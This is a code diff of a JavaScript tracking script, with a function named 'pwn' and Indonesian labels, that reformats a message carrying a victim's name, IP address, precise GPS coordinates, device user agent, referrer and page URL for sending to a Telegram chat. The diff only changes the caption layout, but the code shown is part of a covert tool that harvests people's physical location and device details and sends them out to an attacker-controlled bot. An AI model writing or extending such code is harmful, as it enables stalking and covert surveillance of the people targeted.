@@ -96,12 +96,18 @@ async function pwn(){
 function sendTelegram(data){
   const caption=`
 🔪 LACAKAN BARU 🔪
-Target: ${data.target}
-IP    : ${data.ip}
-GPS   : ${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
-UA    : ${data.ua}
-Ref   : ${data.ref}
-URL   : ${data.url}
+👤NAMA TARGET : 
+${data.target}
+📍IP LOKASI :
+${data.ip}
+📤GPS LOKASI: 
+${data.gps.lat}, ${data.gps.lon} (±${data.gps.acc}m)
+💻PERANGKAT : 
+${data.ua}
+🗃REFERENSI : 
+${data.ref}
+🔗TAUTAN : 
+${data.url}
   `.trim();
   const form=new FormData();
   form.append('chat_id',CHAT_ID);
